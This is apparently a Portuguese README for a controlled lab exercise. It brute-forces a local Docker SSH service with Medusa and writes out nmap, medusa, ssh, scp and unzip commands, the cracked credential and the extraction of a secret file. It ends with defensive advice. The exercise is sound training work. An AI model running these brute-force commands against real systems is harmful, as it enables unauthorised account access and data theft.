🚀 Desafio Medusa Brute Force

Este laboratório demonstra o uso da ferramenta Medusa para realizar testes de força bruta em um serviço SSH exposto em ambiente controlado (container Docker).
O objetivo é evidenciar como credenciais fracas podem ser exploradas, bem como a importância de utilizar senhas fortes e configurar serviços de forma segura.

📂 Estrutura do Projeto

1 - ambiente_controlado.png → topologia/visão do ambiente de teste

2 - arquivos.png → arquivos criados para o desafio (users.txt, password.txt, secret.txt)

3 - bruteforce.png → evidência da execução do ataque com Medusa

4 - arquivos_extraidos.png → evidência de acesso e extração dos arquivos após a descoberta da senha

users.txt → lista de usuários utilizados no teste

password.txt → lista de senhas utilizadas no teste

secret.txt → arquivo protegido armazenado no container alvo

🛠️ Ambiente

Sistema base: Kali Linux

Ferramenta de ataque: Medusa v2.3

Serviço alvo: SSH exposto em container Docker (porta 2222 → 22 interno)

Usuário vulnerável: ctf

Senha descoberta: ctf12345

⚡ Execução do Ataque

Verificação de portas abertas

nmap -sV -p 2222 127.0.0.1


Força bruta com Medusa

medusa -h 127.0.0.1 -n 2222 -U users.txt -P passwords.txt -M ssh -t 10 -f -O medusa_local.log


✅ Resultado:

ACCOUNT FOUND: [ssh] Host: 127.0.0.1 User: ctf Password: ctf12345 [SUCCESS]


Acesso ao container

ssh -p 2222 ctf@127.0.0.1


Extração do arquivo secreto

scp -P 2222 ctf@127.0.0.1:/home/ctf/archive.zip .
unzip -P toor archive.zip

📸 Evidências

As imagens numeradas (1 - ...png até 4 - ...png) mostram as etapas:

Ambiente controlado

Arquivos preparados

Ataque de força bruta

Arquivos extraídos com sucesso

🔒 Conclusão

Este exercício comprova que:

Serviços com credenciais fracas são facilmente exploráveis com ferramentas automatizadas.

Adoção de senhas fortes e controles adicionais de segurança (como fail2ban, MFA e segmentação de rede) são fundamentais para reduzir riscos.